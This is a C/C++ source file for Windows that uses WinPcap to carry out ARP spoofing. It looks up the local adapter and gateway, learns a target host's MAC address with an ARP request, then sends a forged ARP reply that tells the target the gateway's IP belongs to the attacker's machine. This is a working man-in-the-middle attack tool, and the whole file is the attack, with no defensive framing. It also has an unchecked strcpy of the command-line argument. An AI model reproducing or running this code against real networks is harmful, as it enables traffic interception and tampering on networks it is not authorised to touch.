
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h> /* for exit() */
#include <time.h>
#include <pcap.h>
#include <IPHlpApi.h>
#include <process.h>

#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib, "wpcap.lib")
#define HAVE_STRUCT_TIMESPEC

//ethernet header structure
struct ethhdr
{
	unsigned char dstMAC[6];	//destination mac
	unsigned char srcMAC[6];	//source ip
	unsigned char type[2];		//next protocol type
};
// arp header structure
struct arphdr
{
	unsigned char htype[2];				// hardware type
	unsigned char ptype[2];				// protocol type
	unsigned char hlen[1];					// hardware address length
	unsigned char plen[1];					// protocol address length
	unsigned char opcode[2];				// arp opcode
	unsigned char srcMAC[6];	// source mac
	unsigned char srcIP[4];		// source ip
	unsigned char dstMAC[6];	// destination mac
	unsigned char dstIP[4];		// destination ip
};
ethhdr eth;
arphdr arp;

//Spoofing function
void ARPSpoofing(unsigned char *Gateway) {
	pcap_if_t *alldevs;
	pcap_t *pd;
	pcap_if_t *d;
	char errbuf[PCAP_ERRBUF_SIZE];
	u_char packet[1000];
	int i = 0;

	//Retrieve the device list on the local machine
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	//select device
	for (d = alldevs; d->next; d = d->next, i++);

	//no network device
	if (i == 0 && d == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return;
	}


	//open adapter
	if ((pd = pcap_open_live(
		d->name,      // name of the device
		65536,         // portion of the packet to capture. It doesn't matter in this case 
		0,            // promiscuous mode (nonzero means promiscuous)
		1000,         // read timeout
		errbuf         // error buffer
	)) == NULL)
		return;

	memcpy(arp.srcIP, Gateway, 4);		//chnage srcIP to gateway
	memcpy(arp.opcode, "\x00\x02", 2);	//change opcode to reply
	memcpy(packet, &eth, sizeof(eth));	//fill the packet
	memcpy(packet + sizeof(eth), &arp, sizeof(arp));	//fill the packet

	//packet send
	if (pcap_sendpacket(pd, packet, sizeof(eth) + sizeof(arp)) != 0)
	{
		fprintf(stderr, "\n %s Error sending the packet: \n", pcap_geterr(pd));
		exit(1);
	}
}

void Packet_Check(unsigned char *user, const struct pcap_pkthdr *h, const unsigned char *p)
{	
	p += 12; //dst,src MAC
	if (*((unsigned short*)p) == 0x608)
	{
		p += 2; //type
		p += 6; //len, type
		if (*((unsigned short*)p) == 0x200) //opcode (little endian)
		{
			p += 2;	//opcode
			p += 6; //dstMAC
			if (strncmp((char*)((unsigned int*)p), (char*)arp.dstIP,4) == 0)
			{
				p += 4;	//dstIP
				p += 6;	//srcMAC
				if (strncmp((char*)((unsigned int*)p), (char*)arp.srcIP, 4) == 0)
				{
					printf("Success!\n");
					p -= 16;	//return dstMAC
					memcpy(arp.dstMAC, p, 6);
					memcpy(eth.dstMAC, p, 6);
				}
			}
				
		}
	}

}

unsigned __stdcall RecvPacket(void *pd)
{
	//packet receive
	if (pcap_loop((pcap_t*)pd, -1, Packet_Check, 0) < 0)
	{
		return 0;
	}
}

void GetDstMAC(unsigned char *srcIP, unsigned char *srcMAC, unsigned char *dstIP, unsigned char *dstMAC, unsigned char * gatewayC)
{
	pcap_if_t *alldevs;
	pcap_t *pd;
	pcap_if_t *d;
	char errbuf[PCAP_ERRBUF_SIZE];
	u_char packet[1000];
	int i = 0;


	// Retrieve the device list on the local machine
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	// select device
	for (d = alldevs; d->next; d = d->next, i++);

	// no device
	if (i == 0 && d == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return;
	}
	//open adapter
	if ((pd = pcap_open_live(
		d->name,      // name of the device
		65536,         // portion of the packet to capture. It doesn't matter in this case 
		0,            // promiscuous mode (nonzero means promiscuous)
		1000,         // read timeout
		errbuf         // error buffer
	)) == NULL)
		return;


	//setting ehternet header
	memcpy(eth.dstMAC, "\xff\xff\xff\xff\xff\xff", 6);
	memcpy(eth.srcMAC, srcMAC, 6);
	memcpy(eth.type, "\x08\x06", 2);
	

	//setting ethernet header
	memcpy(arp.htype, "\x00\x01", 2);
	memcpy(arp.ptype, "\x08\x00", 2);
	memcpy(arp.hlen, "\x06", 1);
	memcpy(arp.plen, "\x04", 1);
	
	memcpy(arp.opcode, "\x00\x01", 2);
	memcpy(arp.srcMAC, srcMAC, 6);
	memcpy(arp.srcIP, srcIP, 4);
	memcpy(arp.dstMAC, "\x00", 6);
	
	memcpy(arp.dstIP, dstIP, 4);

	//fill the packet
	memcpy(packet, &eth, sizeof(eth));
	memcpy(packet + sizeof(eth), &arp, sizeof(arp));

	//make thread (packet recieve)
	HANDLE th = (HANDLE)_beginthreadex(NULL, 0, &RecvPacket, pd, NULL, 0);
	Sleep(1000);

	//packet send
	if (pcap_sendpacket(pd, packet, sizeof(eth)+sizeof(arp)) != 0)
	{
		fprintf(stderr, "\n %s Error sending the packet: \n", pcap_geterr(pd));
		exit(1);
	}

	//wait thread 
	WaitForSingleObject(th, 1000);
	pcap_close(pd);


}
void GetAdapterInfo(unsigned char* srcIP, unsigned char* srcMAC, unsigned char* dstIP, unsigned char* Gateway)
{
	DWORD dwStatus;
	PIP_ADAPTER_INFO pAdapterInfo = NULL;
	ULONG ulBuffer = 0;

	//get network info
	dwStatus = GetAdaptersInfo(pAdapterInfo, &ulBuffer);

	//if network info are overflow then use malloc and receive
	if (dwStatus == ERROR_BUFFER_OVERFLOW)
	{
		free(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulBuffer);
		dwStatus = GetAdaptersInfo(pAdapterInfo, &ulBuffer);
		if (pAdapterInfo == NULL)
			printf("Error!");
	}

	//get srcMAC
	memcpy(srcMAC, pAdapterInfo->Address, sizeof(pAdapterInfo->Address));

	//get gateway (divide gateway 4 area)
	char *ptr = 0;
	ptr = strtok(pAdapterInfo->GatewayList.IpAddress.String, ".");
	int i = 0;
	while (i<4) {
		Gateway[i++] = atoi(ptr);
		ptr = strtok(NULL, ".");
	}

	//get srcIP(divide IP 4 area)
	ptr = 0;
	ptr = strtok(pAdapterInfo->IpAddressList.IpAddress.String, ".");
	i = 0;
	while (i<4) {
		srcIP[i++] = atoi(ptr);
		ptr = strtok(NULL, ".");
	}

	//get dstIP(divide IP 4 area)
	ptr = 0;
	unsigned char dip[20];
	memcpy(dip, dstIP, 15);
	ptr = strtok((char*)dip, ".");
	i = 0;
	while (i<4) {
		dstIP[i++] = atoi(ptr);
		ptr = strtok(NULL, ".");
	}
}
int main(int argc, char **argv)
{
	unsigned char srcIP[16];
	unsigned char srcMAC[24];
	unsigned char gateway[16];
	unsigned char dstMAC[24];
	unsigned char dstIP[16];

	//input
	strcpy((char*)dstIP, argv[1]);

	//memory setting
	memset(srcIP, 0, sizeof(srcIP));
	memset(srcMAC, 0, sizeof(srcMAC));
	memset(gateway, 0, sizeof(gateway));

	//get network info
	GetAdapterInfo(srcIP, srcMAC, dstIP, gateway);

	//send arp / receive arp
	GetDstMAC(srcIP, srcMAC, dstIP, dstMAC, gateway);

	//attack!
	ARPSpoofing(gateway);
	return 0;
}
